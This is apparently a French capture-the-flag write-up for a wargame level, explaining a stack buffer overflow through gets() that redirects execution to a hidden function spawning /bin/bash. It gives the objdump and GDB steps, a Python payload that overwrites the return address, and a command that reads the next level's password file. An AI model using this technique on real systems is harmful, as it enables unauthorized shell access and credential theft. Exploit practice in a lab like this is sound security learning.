Avec objdump on observe qu'il y a une fonction run qui execute la fonction system avec  "/bin/bash"

```bash
objdump -d level1 | less
```

On lance GDB et on s'aperçoit qu'il y a un buffer de 64
```gdb
0x08048486 <+6>:     sub    esp,0x50
```

La fonction run n'est jamais appelé mais on peux exploiter un buffer overflow car gets est appelé dans le main

```gdb
0x08048490 <+16>:    call   0x8048340 <gets@plt>
```

On a plus qu'a changer l'adresse de retour de la fonction pour la faire pointé sur l'addresse de run que l'on aura récupéré avec GDB

```bash
python -c "print('B' * 76 + '\x44\x84\x04\x08')" > /tmp/exploit
cat /tmp/exploit - | ./level1
```

On doit ecrire dans un fichier car gets lis les '\x' un a un du coup la mémoire n'est pas rempli comme on le souhaite

```bash
cat /home/user/level2/.pass
```